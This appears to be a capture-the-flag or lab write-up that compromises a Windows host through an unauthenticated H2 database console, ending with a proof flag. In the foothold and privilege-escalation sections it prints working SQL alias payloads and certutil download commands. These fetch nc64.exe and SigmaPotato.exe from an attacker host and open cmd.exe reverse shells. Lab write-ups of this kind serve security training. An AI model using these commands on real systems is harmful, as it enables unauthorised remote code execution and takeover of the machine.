**Metadata**

- IP Address:  192.168.173.66
- Hostname:  jacko
- OS: 	Windows
- Found Credentials/Users:
Tony

Main Objectives:


Local.txt = 
Proof.txt = 991ba12e26b062ff2c604dd7d1dd18f1

**Enumeration**

1. NMAP Scans (TCP/UDP)

```
sudo nmap -sS --top-ports 100 --open -T4 -Pn --max-retries 1 --min-rate 500 --host-timeout 60s -oA nmap/nmap_fast 192.168.173.66
# Fast scan to start with
PORT    STATE SERVICE
80/tcp  open  http
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds


sudo nmap -sT -p- --open -T4 -Pn --max-retries 2 --min-rate 300 -oA nmap/nmap_full 192.168.173.66
# Full TCP scan.
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5040/tcp  open  unknown
8082/tcp  open  blackice-alerts
9092/tcp  open  XmlIpcRegSvc
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49668/tcp open  unknown

sudo nmap -vv --reason -Pn -A --open --osscan-guess --version-all -p- -oN nmap/nmap_veryfull 192.168.173.66 
# Very full NMAP

PORT      STATE SERVICE       REASON          VERSION
80/tcp    open  http          syn-ack ttl 125 Microsoft IIS httpd 10.0
|_http-title: H2 Database Engine (redirect)
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 125
5040/tcp  open  unknown       syn-ack ttl 125
8082/tcp  open  http          syn-ack ttl 125 H2 database http console
|_http-favicon: Unknown favicon MD5: D2FBC2E4FB758DC8672CDEFB4D924540
|_http-title: H2 Console
| http-methods: 
|_  Supported Methods: GET POST
9092/tcp  open  XmlIpcRegSvc? syn-ack ttl 125
49664/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC


sudo nmap -sC -p 22,80,111,139,445,2049 -T4 -oA nmap/nmap_scripts 192.168.173.66
# Run Scripts on open ports

sudo nmap -sU --open --top-ports 100 -T4 --max-retries 1 --host-timeout 90s -oA nmap/udp_fast 192.168.173.66
# Fast UDP scan

Nmap done: 1 IP address (1 host up) scanned in 163.91 seconds

sudo nmap -sU -p- --open -T4 --max-retries 0 --min-rate 300 --host-timeout 10m -oA nmap/udp_full 192.168.173.66
# Full UDP Scan

Nmap done: 1 IP address (1 host up) scanned in 163.91 seconds


```

2. Port 8082 Blackice-Alerts

```
- Visted site. It's an H2 Console. 
- nikto -h http://192.168.173.66
  + Server: No banner retrieved
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Multiple index files found: /index.html, /index.jsp, /index.do.
+ /clusterframe.jsp: Macromedia JRun 4 build 61650 remote administration interface is vulnerable to several XSS attacks.
+ /IlohaMail/blank.html: IlohaMail 0.8.10 contains a XSS vulnerability. Previous versions contain other non-descript vulnerabilities.
+ /view_source.jsp: Resin 2.1.2 view_source.jsp allows any file on the system to be viewed by using \..\ directory traversal. This script may be vulnerable.
+ /webmail/blank.html: IlohaMail 0.8.10 contains an XSS vulnerability. Previous versions contain other non-descript vulnerabilities.
+ /IDSWebApp/IDSjsp/Login.jsp: Tivoli Directory Server Web Administration.
+ /servlet/org.apache.catalina.ContainerServlet/<script>alert('Vulnerable')</script>: Apache-Tomcat is vulnerable to Cross Site Scripting (XSS) by invoking java classes.
+ /servlet/org.apache.catalina.Context/<script>alert('Vulnerable')</script>: Apache-Tomcat is vulnerable to Cross Site Scripting (XSS) by invoking java classes.
+ /servlet/org.apache.catalina.Globals/<script>alert('Vulnerable')</script>: Apache-Tomcat is vulnerable to Cross Site Scripting (XSS) by invoking java classes.
+ /servlet/org.apache.catalina.servlets.WebdavStatus/<script>alert('Vulnerable')</script>: Apache-Tomcat is vulnerable to Cross Site Scripting (XSS) by invoking java classes.
+ /nosuchurl/><script>alert('Vulnerable')</script>: JEUS is vulnerable to Cross Site Scripting (XSS) when requesting non-existing JSP pages. See: https://seclists.org/fulldisclosure/2003/Jun/494
+ /~/<script>alert('Vulnerable')</script>.aspx?aspxerrorpath=null: Cross site scripting (XSS) is allowed with .aspx file requests. See: http://www.cert.org/advisories/CA-2000-02.html
+ /~/<script>alert('Vulnerable')</script>.aspx: Cross site scripting (XSS) is allowed with .aspx file requests. See: http://www.cert.org/advisories/CA-2000-02.html
+ /~/<script>alert('Vulnerable')</script>.asp: Cross site scripting (XSS) is allowed with .asp file requests. See: http://www.cert.org/advisories/CA-2000-02.html
+ /node/view/666\"><script>alert(document.domain)</script>: Drupal 4.2.0 RC is vulnerable to Cross Site Scripting (XSS).
+ /mailman/listinfo/<script>alert('Vulnerable')</script>: Mailman is vulnerable to Cross Site Scripting (XSS). Upgrade to version 2.0.8 to fix.
+ /index.php/\"><script><script>alert(document.cookie)</script><: eZ publish v3 and prior allow Cross Site Scripting (XSS).
+ /bb000001.pl<script>alert('Vulnerable')</script>: Actinic E-Commerce services is vulnerable to Cross Site Scripting (XSS). See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1732
+ /a.jsp/<script>alert('Vulnerable')</script>: JServ is vulnerable to Cross Site Scripting (XSS) when a non-existent JSP file is requested. Upgrade to the latest version of JServ.
+ /<script>alert('Vulnerable')</script>.thtml: Server is vulnerable to Cross Site Scripting (XSS).
+ /<script>alert('Vulnerable')</script>.shtml: Server is vulnerable to Cross Site Scripting (XSS).
+ /<script>alert('Vulnerable')</script>.aspx: Cross site scripting (XSS) is allowed with .aspx file requests (may be Microsoft .net).
+ /cfide/Administrator/startstop.html: Can start/stop the Coldfusion server.
+ /SiteScope/htdocs/SiteScope.html: The SiteScope install may allow remote users to get sensitive information about the hosts being monitored. See: OSVDB-613
+ /ncl_items.html: This may allow attackers to reconfigure your Tektronix printer. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-1508
+ /<script>alert('Vulnerable')</script>: Server is vulnerable to Cross Site Scripting (XSS). See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0681
+ /manager/contextAdmin/contextAdmin.html: Tomcat may be configured to let attackers read arbitrary files. Restrict access to /admin. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0672
+ /jk-manager/contextAdmin/contextAdmin.html: Tomcat may be configured to let attackers read arbitrary files. Restrict access to /admin. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0672
+ /jk-status/contextAdmin/contextAdmin.html: Tomcat may be configured to let attackers read arbitrary files. Restrict access to /admin. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0672
+ /admin/contextAdmin/contextAdmin.html: Tomcat may be configured to let attackers read arbitrary files. Restrict access to /admin. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0672
+ /host-manager/contextAdmin/contextAdmin.html: Tomcat may be configured to let attackers read arbitrary files. Restrict access to /admin. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0672
+ ERROR: Error limit (20) reached for host, giving up. Last error: error reading HTTP response
+ Scan terminated: 14 error(s) and 33 item(s) reported on remote host
+ End Time:           2025-12-22 18:43:06 (GMT-7) (776 seconds)

```

3. Port 9092 XmlIpcRegSvc

```
- "9092 XmlIpcRegSvc" refers to

**port 9092**, which is officially registered with the IANA for the "Xml-Ipc Server Reg" service, but is most commonly associated with **Apache Kafka** brokers and the **H2 database** in modern use

- Login found at http://192.168.173.66:8082/tools.jsp?jsessionid=117d679a0f3c176a899db4f5d9a4b93e.
  
  
```

4. Web Enumeration 

```
- Site visit: H2 Database Engine.
- Possible exploit: https://www.exploit-db.com/exploits/45506
- nikto -h http://192.168.173.66 
  + Server: Microsoft-IIS/10.0
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ OPTIONS: Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST .
+ OPTIONS: Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST .
+ /javadoc/: Documentation...?.
+ 8102 requests: 0 error(s) and 5 item(s) reported on remote host
+ End Time:           2025-12-22 18:57:06 (GMT-7) (1645 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested


gobuster dir -u http://192.168.173.66 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
# Directory brute forcing
/images               (Status: 301) [Size: 152] [--> http://192.168.173.66/images/]
/help                 (Status: 301) [Size: 150] [--> http://192.168.173.66/help/]
/html                 (Status: 301) [Size: 150] [--> http://192.168.173.66/html/]
/Images               (Status: 301) [Size: 152] [--> http://192.168.173.66/Images/]
/text                 (Status: 301) [Size: 150] [--> http://192.168.173.66/text/]
/Help                 (Status: 301) [Size: 150] [--> http://192.168.173.66/Help/]
/HTML                 (Status: 301) [Size: 150] [--> http://192.168.173.66/HTML/]
/IMAGES               (Status: 301) [Size: 152] [--> http://192.168.173.66/IMAGES/]
/Text                 (Status: 301) [Size: 150] [--> http://192.168.173.66/Text/]
/Html                 (Status: 301) [Size: 150] [--> http://192.168.173.66/Html/]
/javadoc              (Status: 301) [Size: 153] [--> http://192.168.173.66/javadoc/]
/TEXT                 (Status: 301) [Size: 150] [--> http://192.168.173.66/TEXT/]
/HELP                 (Status: 301) [Size: 150] [--> http://192.168.173.66/HELP/]



gobuster dir -u http://192.168.173.66 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,asp,aspx,txt,log,bak,conf,ini,db,json,zip,tar,gz
# Common directories and files
/HTML                 (Status: 301) [Size: 150] [--> http://192.168.173.66/HTML/]
/Help                 (Status: 301) [Size: 150] [--> http://192.168.173.66/Help/]
/Images               (Status: 301) [Size: 152] [--> http://192.168.173.66/Images/]
/help                 (Status: 301) [Size: 150] [--> http://192.168.173.66/help/]
/html                 (Status: 301) [Size: 150] [--> http://192.168.173.66/html/]
/images               (Status: 301) [Size: 152] [--> http://192.168.173.66/images/]
/index.html           (Status: 200) [Size: 1595]
/javadoc              (Status: 301) [Size: 153] [--> http://192.168.173.66/javadoc/]
/text                 (Status: 301) [Size: 150] [--> http://192.168.173.66/text/]


gobuster dir -u http://192.168.173.66 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -x php,asp,aspx,txt,log,bak,conf,ini,db,json,zip,tar,gz
# Files
/index.html           (Status: 200) [Size: 1595]
/.                    (Status: 200) [Size: 1595]
/Index.html           (Status: 200) [Size: 1595]
/iisstart.htm         (Status: 200) [Size: 696]


```

5.  SMB Port 139, 445 Enumeration

```
smbclient -L //192.168.173.66 -U anonymous
Password for [WORKGROUP\anonymous]:
session setup failed: NT_STATUS_LOGON_FAILURE

smbmap -H 192.168.173.66                  
[\] Checking for open ports...                                                                                      [|] Checking for open ports...                                                                                      [/] Checking for open ports...                                                                                      [*] Detected 1 hosts serving SMB
[-] Initializing hosts...                                                                                           [\]                                                                                              [/] Authenticating...                                                                                               [*] Established 1 SMB connections(s) and 0 authenticated session(s)
[-] Authenticating...                                                                                               [\]                            [|] Enumerating shares...                                                                                           [!] Something weird happened on (192.168.173.66) Error occurs while reading from remote(104) on line 1015
[/] Closing connections..                                                                                           [-] Closing connections..                                                                                           [*] Closed 1 connections  



```

7. Possible Exploits

```
1. https://medium.com/r3d-buck3t/chaining-h2-database-vulnerabilities-for-rce-9b535a9621a2
2. https://www.exploit-db.com/exploits/49384
```

8. Other Notes

```

```

**Initial Foothold** 

1. Exploit Steps

```
1. Naviaged to the H2 Database at http://192.168.173.66:8082/login.jsp?jsessionid=d24a8a8320b22dc017e29629bb4ed298.
2. Logged onto to the jdbc:h2:~/test database using the sa username with no password. 
3. Using the the exploit found here, https://www.exploit-db.com/exploits/49384, used the Java Native Interface to load a Java class without needing to use the Java Compiler. 
4. Evaluated script by creating alias with 'whoami command' and executing. Received response |   |
|---|
|jacko\tony|.
5. Continued that strategy, to download nc64.exe.
   
   CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("certutil -urlcache -split -f http://192.168.45.244/nc64.exe C:\\Windows\\Temp\\nc64.exe").getInputStream()).useDelimiter("\\Z").next()');

6. Then ran nc64.exe in order to get a reverse shell. 
   
   CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("C:\\Windows\\Temp\\nc64.exe 192.168.45.244 80 -e cmd.exe").getInputStream()).useDelimiter("\\Z").next()');
```

2. Shell Access

```
Could not run commands without full executable path. Fixed by googling location running full command. 
```


**Post-Exploitation**

1. Basic System Info

```
#CMD
whoami
C:\Windows\SysWOW64\whoami.exe

whoami /priv
C:\Windows\SysWOW64\whoami.exe /priv
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled

```

5. Possible PE Paths

```
1. SeImpersonatePrivilege        Impersonate a client after authentication Enabled 

```

**Privilege Escalation**

1. PE Steps

```
1. C:\Windows\System32\certutil.exe -urlcache -split -f "http://192.168.45.244/SigmaPotato.exe" SigmaPotato.exe

2. C:\Windows\System32\certutil.exe -urlcache -split -f "http://192.168.45.244/nc64.exe" nc64.exe

3. .\SigmaPotato.exe ".\nc64.exe 192.168.45.244 80 -e cmd.exe"


```

2. Notes

```

```

